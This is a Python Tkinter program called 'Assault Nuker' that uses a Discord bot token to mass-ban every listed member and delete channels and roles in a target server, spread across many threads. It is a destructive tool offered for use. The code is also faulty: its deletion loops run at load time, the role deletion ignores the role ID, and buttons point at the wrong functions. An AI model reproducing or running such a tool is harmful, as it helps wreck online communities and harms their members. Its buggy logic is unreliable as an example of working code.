import tkinter , json
import asyncio
import string
from tkinter import *
import requests, threading, requests_futures.sessions, queue, random
from requests_futures.sessions import FuturesSession
from random import randint

main_window = Tk(className='. Assault Nuker - Menu')
# set window size
main_window.geometry("1439x792") 

#set cursor
main_window['cursor']='tcross'

#set window color
main_window['background']='#000000'


with open('config.json', 'r') as f:
    config = json.load(f)

 #################### CONFIG ######################
token = config.get("Token")
guild = config.get("Guild")
channels = open('info/cids.txt').read().split('\n')
roles = open('info/rids.txt').read().split('\n')
headers = {'Authorization': f'Bot {token}'}
session = FuturesSession()
q = queue.Queue()
members = open('info/ids.txt').read().split('\n')
####################################################

###################Nuker#########################################################


def Ban(x):
    try:
        r = session.put(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild}/bans/{x}", headers=headers).result()
        if r.status_code in (200, 201, 204):
              print('Banned Member {}'.format(x))
              q.join()
    except Exception as e:
              print(e)


def ChD(channel_id):
            r = session.delete(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild}/channels/{channel_id}", headers=headers).result()
            if r.status_code in (200, 201, 204):
                print(f"deleted a channel")

def DROLE(m):
            r = session.delete(f"https://discord.com/api/v{randint(6,8)}/guilds/{guild}/roles", headers=headers).result()
            if r.status_code in (200, 201, 204):
                print(f" deleted role")


def ytwok():
        for m in members:
          threading.Thread(target=Ban, args=(m,)).start()

def plots():
    for c in channels:
      threading.Thread(target=ChD, args=(c,)).start()

def guap():
  for r in roles:
      threading.Thread(target=DROLE, args=(r,)).start()

def nuke():
  for m in members:
          threading.Thread(target=Ban, args=(m,)).start()

for c in channels:
        threading.Thread(target=ChD, args=(c,)).start()

for r in roles:
        threading.Thread(target=DROLE, args=(r,)).start()




#########################GUI#################################################

#labels
Label(main_window, cursor="tcross", background = "#000000", foreground = "#ffffff",text="Assault Nuker! - Xanthe").grid(row = 1, column = 5)
Label(main_window, cursor="tcross", background= '#000000', foreground= '#ffffff', text="Thread Count: ").grid(row = 9, column = 4)

Button(main_window, bg= 'black', fg= 'red', cursor= 'tcross', text= "Nuke Guild", command = guap).grid(row = 2, column = 5)
Button(main_window, bg='black', fg='red', cursor='tcross', text="Ban Members", command = ytwok).grid(row=3, column=5)
Button(main_window, bg='black', fg='red', cursor='tcross', text="Delete Channel", command = plots).grid(row = 4, column=5)
Button(main_window, bg='black', fg='red', cursor='tcross', text="Delete Roles").grid(row=5, column = 5)

# thread counter
Scale(main_window, from_=1, to=200, sliderlength='50', length='300', background= 'black', fg='white', cursor = 'cross', orient=HORIZONTAL).grid(row = 9, column = 5)


if __name__ in "__main__":
  main_window.mainloop()